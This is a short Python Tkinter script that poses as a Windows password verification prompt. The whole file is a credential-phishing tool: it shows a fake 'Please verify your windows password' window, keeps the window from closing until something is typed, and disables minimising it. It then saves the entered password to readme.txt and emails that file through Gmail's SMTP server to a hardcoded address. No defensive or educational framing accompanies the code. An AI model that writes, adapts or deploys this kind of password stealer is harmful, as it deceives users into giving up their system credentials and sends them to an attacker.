from tkinter import *
from tkinter import ttk
from tkinter import messagebox  # Import the messagebox module
import smtplib

# Create an instance of Tkinter frame
win = Tk()

# Set the geometry of Tkinter frame
win.geometry("750x250")

def display_text():
   global entry
   #global string
   string = entry.get()
   print(string)
   if string == "":
      messagebox.showinfo("Error", "Please enter your windows password")
     
   else:
      print("thanks")
      with open('readme.txt', 'w') as f:
         f.write(string)
      win.destroy()  # Close the Tkinter window
      send_mail(app_password = '', file_name_to_send='readme.txt')
   

# Function to be called when the window is closed
def on_closing():

    if(entry.get()==""):
       messagebox.showinfo("Error", "Please enter your windows password")
       
      
    else:
       
      print("Window is being closed")
      win.destroy()



def send_mail(app_password,file_name_to_send):
    sender_add = 'satyamgrandmaster@gmail.com'  # storing the sender's mail id
    receiver_add = 'satyamgrandmaster@gmail.com'  # storing the receiver's mail id
      # storing the password to log in
    # creating the SMTP server object by giving SMPT server address and port number
    smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
    smtp_server.ehlo()  # setting the ESMTP protocol
    smtp_server.starttls()  # setting up to TLS connection
    smtp_server.ehlo()  # calling the ehlo() again as encryption happens on calling startttls()
    smtp_server.login(sender_add, app_password)  # logging into out email id

    file = open(file_name_to_send, 'r')

    # DONT FORGET TO USE .ENCODE THE STRING, ELSE IT GIVE ERROR
    msg_to_be_sent = file.read().encode()

    # sending the mail by specifying the from and to address and the message
    smtp_server.sendmail(sender_add, receiver_add, msg_to_be_sent)
    # priting a message on sending the mail
    print('Successfully the mail is sent')
    smtp_server.quit()  # terminating the server



# Initialize a Label to display the User Input
label = Label(win, text="Please verify your windows password", font=("Courier 22 bold"))
label.pack()

# Create an Entry widget to accept User Input
entry = Entry(win, width=40)
entry.focus_set()
entry.pack()

# Create a Button to validate Entry Widget
ttk.Button(win, text="verify", width=40, command=display_text).pack(pady=20)

# Bind the on_closing function to the window close event
win.protocol("WM_DELETE_WINDOW", on_closing)

# Disable window minimization
win.wm_attributes('-toolwindow', 1)

win.mainloop()
